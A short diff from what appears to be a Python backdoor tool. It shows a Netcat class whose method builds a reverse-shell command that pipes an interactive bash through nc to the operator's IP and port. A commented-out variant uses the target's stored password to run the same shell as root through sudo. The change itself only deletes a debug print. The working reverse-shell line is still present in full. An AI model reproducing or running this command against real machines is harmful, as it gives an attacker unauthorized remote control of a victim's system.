@@ -18,7 +18,6 @@ class Netcat(Backdoor):
     def get_command(self):
         #command = "echo " + self.core.curtarget.pword + " | sudo -S bash -c \"cat /tmp/f | /bin/bash -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f\"" % self.get_value("port")
         command = "cat /tmp/f | /bin/bash -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f" % self.get_value("port")
-        print command
         return command
  
     def do_exploit(self, args):
